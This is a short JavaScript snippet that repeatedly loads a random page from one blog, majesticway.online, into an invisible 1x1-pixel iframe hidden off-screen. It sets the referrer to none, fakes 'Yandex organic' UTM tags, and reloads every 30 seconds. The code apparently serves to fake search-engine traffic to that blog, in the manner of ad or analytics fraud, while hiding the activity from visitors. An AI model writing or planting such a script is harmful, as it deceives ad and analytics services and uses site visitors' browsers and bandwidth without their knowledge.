  const urls = [
    "https://www.majesticway.online/2024/08/python.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/10-javascript.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/2024.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/sql.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/blog-post_20.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/blog-post_52.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/blog-post_97.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/ai.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.majesticway.online/2024/08/5-2024.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
